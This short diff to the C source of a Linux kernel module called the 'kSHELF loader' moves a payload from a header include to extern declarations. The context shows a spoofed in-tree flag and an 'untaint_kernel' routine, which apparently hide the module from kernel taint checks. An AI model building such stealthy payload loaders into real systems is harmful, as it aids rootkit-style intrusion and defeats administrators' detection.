@@ -6,8 +6,6 @@
 #include "include/shelf.h"
 #include "include/util.h"
 
-#include "/workdir/artifacts/payload.h"
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("bah");
 MODULE_DESCRIPTION("kSHELF loader");
@@ -18,6 +16,9 @@ MODULE_INFO(intree, "true");
 static unsigned long int taint_value = 0;
 module_param(taint_value, long, 0);
 MODULE_PARM_DESC(taint_value, "Taint Value");
+
+extern unsigned char payload[];
+extern unsigned int payload_len;
 
 /* prototypes */
 void untaint_kernel(unsigned long value);
